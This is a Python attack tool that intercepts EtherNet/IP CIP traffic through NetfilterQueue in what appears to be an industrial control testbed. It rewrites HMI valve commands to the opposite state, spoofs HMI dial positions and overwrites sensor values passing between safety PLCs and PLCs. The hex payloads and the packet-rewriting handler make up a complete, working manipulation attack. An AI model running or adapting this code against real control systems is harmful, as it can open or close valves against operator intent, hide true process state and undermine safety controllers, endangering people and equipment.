#!/usr/bin/env python3
import sys
import os
import struct

from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

##############################################################################
# IP Name Library
##############################################################################
HOST_INFO = {
    "SFPLC100": "10.0.0.101",
    "PLC100":   "10.0.0.111",
    "SFPLC200": "10.0.0.102",
    "PLC200":   "10.0.0.112",
    "SFPLC300": "10.0.0.103",
    "PLC300":   "10.0.0.113",
    "HMI":      "10.0.0.150",
}

def resolve_name_from_ip(ip: str) -> str:
    for name, address in HOST_INFO.items():
        if address == ip:
            return name
    return ip

##############################################################################
# CIP Command Lists
##############################################################################
CIP_VALVE_COMMANDS = [
    # Real CIP commands
    ("Close V100 (HMI cmd = [8]) --> Open V100",
     "4d07910c563130305f484d493a313131c30001000000",
     "4d07910c563130305f484d493a313131c30001000100"),
    ("Open V100 (HMI cmd = [7])--> Close V100",
     "4d07910c563130305f484d493a313131c30001000100",
     "4d07910c563130305f484d493a313131c30001000000"),
    ("Close SV100 (HMI cmd = [2])--> Open SV100",
     "4d08910d53563130305f484d493a31303200c30001000000",
     "4d08910d53563130305f484d493a31303200c30001000100"),
    ("Open SV100 (HMI cmd = [1])--> Close SV100",
     "4d08910d53563130305f484d493a31303200c30001000100",
     "4d08910d53563130305f484d493a31303200c30001000000"),
    ("Close V200 (HMI cmd = [10])--> Open V200",
     "4d07910c563230305f484d493a323131c30001000000",
     "4d07910c563230305f484d493a323131c30001000100"),
    ("Open V200 (HMI cmd = [9])--> Close V200",
     "4d07910c563230305f484d493a323131c30001000100",
     "4d07910c563230305f484d493a323131c30001000000"),
    ("Close SV200 (HMI cmd = [4])--> Open SV200",
     "4d08910d53563230305f484d493a32303200c30001000000",
     "4d08910d53563230305f484d493a32303200c30001000100"),
    ("Open SV200 (HMI cmd = [3])--> Close SV200",
     "4d08910d53563230305f484d493a32303200c30001000100",
     "4d08910d53563230305f484d493a32303200c30001000000"),
    ("Close V300 (HMI cmd = [12])--> Open V300",
     "4d07910c563330305f484d493a333131c30001000000",
     "4d07910c563330305f484d493a333131c30001000100"),
    ("Open V300 (HMI cmd = [11])--> Close V300",
     "4d07910c563330305f484d493a333131c30001000100",
     "4d07910c563330305f484d493a333131c30001000000"),
    ("Close SV300 (HMI cmd = [6])--> Open SV300",
     "4d08910d53563330305f484d493a33303200c30001000000",
     "4d08910d53563330305f484d493a33303200c30001000100"),
    ("Open SV300 (HMI cmd = [5])--> Close SV300",
     "4d08910d53563330305f484d493a33303200c30001000100",
     "4d08910d53563330305f484d493a33303200c30001000000"),
]

FAKE_HMI_DIAL_COMMANDS = [
    ("Fake V100 HMI Dial --> Open",
     "cc000000c3000000",
     "cc000000c3000100"),
    ("Fake V100 HMI Dial --> Close",
     "cc000000c3000100",
     "cc000000c3000000"),
    ("Fake SV100 HMI Dial --> Open",
     "cc000000c3000000",
     "cc000000c3000100"),
    ("Fake SV100 HMI Dial --> Close",
     "cc000000c3000100",
     "cc000000c3000000"),
    ("Fake V200 HMI Dial --> Open",
     "cc000000c3000000",
     "cc000000c3000100"),
    ("Fake V200 HMI Dial --> Close",
     "cc000000c3000100",
     "cc000000c3000000"),
    ("Fake SV200 HMI Dial --> Open",
     "cc000000c3000000",
     "cc000000c3000100"),
    ("Fake SV200 HMI Dial --> Close",
     "cc000000c3000100",
     "cc000000c3000000"),
    ("Fake V300 HMI Dial --> Open",
     "cc000000c3000000",
     "cc000000c3000100"),
    ("Fake V300 HMI Dial --> Close",
     "cc000000c3000100",
     "cc000000c3000000"),
    ("Fake SV300 HMI Dial --> Open",
     "cc000000c3000000",
     "cc000000c3000100"),
    ("Fake SV300 HMI Dial --> Close",
     "cc000000c3000100",
     "cc000000c3000000"),
]

# A simple mapping from "which PLC or SFPLC" to IP. 
FAKE_DIAL_FLOW = {
    "V100":  ("10.0.0.111", "10.0.0.150"),  # PLC100->HMI
    "SV100": ("10.0.0.101", "10.0.0.150"),  # SFPLC100->HMI
    "V200":  ("10.0.0.112", "10.0.0.150"),  # PLC200->HMI
    "SV200": ("10.0.0.102", "10.0.0.150"),  # SFPLC200->HMI
    "V300":  ("10.0.0.113", "10.0.0.150"),  # PLC300->HMI
    "SV300": ("10.0.0.103", "10.0.0.150"),  # SFPLC300->HMI
}

##############################################################################
# Global Replacements for Real CIP
##############################################################################
REPLACEMENTS = []  # (victim_bytes, replacement_bytes) for real CIP commands

##############################################################################
# Flow-based Replacements for Fake Dials
##############################################################################
CIP_FLOW_REPLACEMENTS = {}

# For sensor overwrites => store a dict of (src_ip, dst_ip) => float
SENSOR_PREFIX = bytes.fromhex("cc000000ca00")
OVERWRITES = {}

##############################################################################
# NFQUEUE Packet Handler
##############################################################################
def process_packet(pkt):
    scapy_pkt = IP(pkt.get_payload())
    modified = False

    if scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw):
        raw_data = bytearray(scapy_pkt[Raw].load)
        original_data = raw_data[:]

        ip_src = scapy_pkt[IP].src
        ip_dst = scapy_pkt[IP].dst

        # 1) Real CIP command replacements (global, no flow restriction)
        for (victim_b, repl_b) in REPLACEMENTS:
            idx = 0
            while True:
                idx = raw_data.find(victim_b, idx)
                if idx == -1:
                    break
                print(f"[*] Replacing CIP cmd (global): {victim_b.hex()} -> {repl_b.hex()}")
                raw_data[idx: idx + len(victim_b)] = repl_b
                idx += len(victim_b)
                modified = True

        # 2) Fake dial flow-based replacements
        if (ip_src, ip_dst) in CIP_FLOW_REPLACEMENTS:
            for (victim_b, repl_b) in CIP_FLOW_REPLACEMENTS[(ip_src, ip_dst)]:
                idx = 0
                while True:
                    idx = raw_data.find(victim_b, idx)
                    if idx == -1:
                        break
                    print(f"[*] Replacing Fake Dial on flow {ip_src}->{ip_dst}: {victim_b.hex()} -> {repl_b.hex()}")
                    raw_data[idx: idx + len(victim_b)] = repl_b
                    idx += len(victim_b)
                    modified = True

        # 3) IP-based sensor overwrites
        key = (ip_src, ip_dst)
        if key in OVERWRITES:
            new_val = OVERWRITES[key]
            new_float_bytes = struct.pack("<f", new_val)

            idx2 = 0
            prefix_len = len(SENSOR_PREFIX)
            while True:
                found_idx = raw_data.find(SENSOR_PREFIX, idx2)
                if found_idx == -1:
                    break

                float_start = found_idx + prefix_len
                if float_start + 4 <= len(raw_data):
                    old_val_bytes = raw_data[float_start:float_start+4]
                    raw_data[float_start:float_start+4] = new_float_bytes
                    print(f"[*] Overwriting sensor {ip_src}->{ip_dst}, old={old_val_bytes.hex()} => new={new_float_bytes.hex()}")
                    modified = True

                idx2 = float_start + 4

        if modified and (raw_data != original_data):
            scapy_pkt[Raw].load = bytes(raw_data)
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum
            pkt.set_payload(bytes(scapy_pkt))

    pkt.accept()

##############################################################################
# Menu & Main
##############################################################################
def main():
    if os.geteuid() != 0:
        print("[!] Must run as root/sudo for netfilterqueue. Exiting.")
        sys.exit(1)

    print("=== CIP packet manipulation tool\n")

    while True:
        print("\nMenu Options:")
        print("  1) Modify CIP commands from HMI (Open/Close valves) (no prompt for flow)")
        print("  2) Inject fake HMI dial positions (auto source->destination for each valve)")
        print("  3) Manipulate sensor value between two devices")
        print("  4) Start attack with current configuration")
        choice = input("Select an option [1-4]: ").strip()

        if choice == "1":
            # Real CIP commands => old approach (global replacements)
            print("\nAvailable CIP Commands (REAL):")
            for i, (desc, victim_hex, repl_hex) in enumerate(CIP_VALVE_COMMANDS, start=1):
                print(f"   {i}) {desc}")

            picks = input("Which command(s) do you want to apply? (e.g. 1,3): ").strip()
            if not picks:
                continue

            for p_str in picks.split(","):
                try:
                    idx_i = int(p_str.strip())
                    if 1 <= idx_i <= len(CIP_VALVE_COMMANDS):
                        desc, victim_hex, repl_hex = CIP_VALVE_COMMANDS[idx_i - 1]
                        v_bytes = bytes.fromhex(victim_hex)
                        r_bytes = bytes.fromhex(repl_hex)
                        REPLACEMENTS.append((v_bytes, r_bytes))
                        print(f"[+] Added real CIP command: {desc}")
                    else:
                        print(f"[!] Invalid index {p_str}")
                except:
                    print(f"[!] Could not parse index {p_str}")

        elif choice == "2":
            # Fake HMI dial changes => automatically map which PLC or SFPLC => HMI
            print("\nAvailable Fake HMI Dial Commands:")
            for i, (desc, victim_hex, repl_hex) in enumerate(FAKE_HMI_DIAL_COMMANDS, start=1):
                print(f"   {i}) {desc}")

            picks = input("Which fake HMI dial(s) to apply? (e.g. 1,2): ").strip()
            if not picks:
                continue

            for p_str in picks.split(","):
                try:
                    idx_i = int(p_str.strip())
                    if 1 <= idx_i <= len(FAKE_HMI_DIAL_COMMANDS):
                        desc, victim_hex, repl_hex = FAKE_HMI_DIAL_COMMANDS[idx_i - 1]
                        # Parse the valve name from the desc. e.g. "Fake V200 HMI Dial --> Close"
                        # Then automatically pick the source/dest from FAKE_DIAL_FLOW

                        # Find "V100", "V200", "SV100", etc.
                        # A simple approach: check if "SV100" in desc, elif "V100" in desc, etc.
                        # Define a small function:

                        valve_id = None
                        for candidate in FAKE_DIAL_FLOW.keys():
                            if candidate in desc:
                                valve_id = candidate
                                break

                        if not valve_id:
                            print(f"[!] Could not find valve match in desc: {desc}")
                            continue

                        (src_ip, dst_ip) = FAKE_DIAL_FLOW[valve_id]
                        v_bytes = bytes.fromhex(victim_hex)
                        r_bytes = bytes.fromhex(repl_hex)
                        CIP_FLOW_REPLACEMENTS.setdefault((src_ip, dst_ip), []).append((v_bytes, r_bytes))

                        print(f"[+] Added Fake HMI Dial: {desc} => flow {src_ip}->{dst_ip}")
                    else:
                        print(f"[!] Invalid index {p_str}")
                except:
                    print(f"[!] Could not parse index {p_str}")

        elif choice == "3":
            # IP-based sensor overwrite
            src_name = input("Enter the source device sending the sensor value (e.g., SFPLC100 or IP): ").strip()
            dst_name = input("Enter the destination device receiving the sensor value (e.g., PLC100 or IP): ").strip()

            # Do a small local resolver:
            def resolve_ip_or_name(user_input: str) -> str:
                up = user_input.upper()
                return HOST_INFO.get(up, user_input)

            src_ip = resolve_ip_or_name(src_name)
            dst_ip = resolve_ip_or_name(dst_name)

            val_str = input("Enter the fake sensor value to inject (e.g., 3.5): ").strip()
            try:
                val_f = float(val_str)
            except:
                val_f = 0.0

            OVERWRITES[(src_ip, dst_ip)] = val_f
            print(f"[+] Sensor value from {src_name}({src_ip}) -> {dst_name}({dst_ip}) = {val_f}")

        elif choice == "4":
            # Start NFQUEUE
            break

        else:
            print("[!] Invalid choice, try again.")

    print("\n--- Final Attack Configuration ---")
    # Summarize real CIP replacements
    if REPLACEMENTS:
        print("[*] Global CIP command replacements (no flow restriction):")
        for (v_b, r_b) in REPLACEMENTS:
            print(f"   victim={v_b.hex()} => replacement={r_b.hex()}")
    else:
        print("[*] No global CIP command replacements chosen.")

    # Summarize CIP_FLOW_REPLACEMENTS
    if CIP_FLOW_REPLACEMENTS:
        print("[*] Fake dial replacements by flow:")
        for (sip, dip), pairs in CIP_FLOW_REPLACEMENTS.items():
            print(f"   Flow {resolve_name_from_ip(sip)}({sip}) -> {resolve_name_from_ip(dip)}({dip}):")
            for (v_b, r_b) in pairs:
                print(f"     victim={v_b.hex()} => replacement={r_b.hex()}")
    else:
        print("[*] No fake dial flow-based replacements chosen.")

    # Summarize sensor overwrites
    if OVERWRITES:
        print("[*] Sensor overwrites:")
        for (src_ip, dst_ip), val in OVERWRITES.items():
            print(f"   {src_ip} -> {dst_ip} => {val}")
    else:
        print("[*] No sensor overwrites chosen.")

    print("\n[*] Binding NFQUEUE. Make sure iptables redirect is set. Press Ctrl+C to stop.\n")

    nfqueue = NetfilterQueue()
    try:
        nfqueue.bind(1, process_packet)
        nfqueue.run()
    except KeyboardInterrupt:
        print("[!] Attack interrupted by user.")
    finally:
        nfqueue.unbind()
        print("[*] Attack ended. NFQUEUE unbound.")


if __name__ == "__main__":
    main()

